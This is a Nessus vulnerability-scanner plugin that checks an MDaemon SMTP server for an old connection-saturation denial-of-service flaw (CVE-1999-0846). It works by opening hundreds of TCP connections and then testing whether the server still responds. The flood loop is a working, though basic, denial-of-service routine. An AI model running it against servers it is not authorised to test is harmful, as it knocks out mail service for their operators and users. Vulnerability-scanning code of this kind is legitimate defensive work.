#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10137);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-1999-0846");
 script_bugtraq_id(8554);
 script_xref(name:"OSVDB", value:"109");
 
 script_name(english:"MDaemon Connection Saturation Remote DoS");
 script_summary(english:"Crashes the remote MTA");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "It was possible to crash the the remote version of MDaemon by\n",
     "establishing a large number of connections to it.  A remote attacker\n",
     "could exploit this to cause a denial of service.\n\n",
     "Note that due to the nature of this vulnerability, Nessus cannot be\n",
     "100% positive on the effectiveness of this check. As a result, this\n",
     "report might be a false positive."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/1999-q4/0134.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();

 if (ACT_FLOOD) script_category(ACT_FLOOD);
 else		script_category(ACT_DENIAL);
 script_family(english:"SMTP problems");
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");

 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#


include("smtp_func.inc");
include("global_settings.inc");

if ( report_paranoia < 2 ) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(get_port_state(port))
{
 i = 0;
 ref_soc = open_sock_tcp(port);
 if ( ! ref_soc ) exit(0);
 banner = smtp_recv_line(socket:ref_soc);
 
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
 while(TRUE)
 {
  soc = open_sock_tcp(port);
  if(!soc){
  	sleep(5);
	soc2 = open_sock_tcp(port);
	if(!soc2){
	 send(socket:ref_soc, data:'HELP\r\n');
         out = smtp_recv_line(socket:ref_soc);
         if ( ! out ) security_warning(port);
         }
	else close(soc2);
        close(ref_soc);
	exit(0);
    }
  if( i > 400)
  {
        close(ref_soc);
 	exit(0);
  }
  i = i + 1;
 }
}
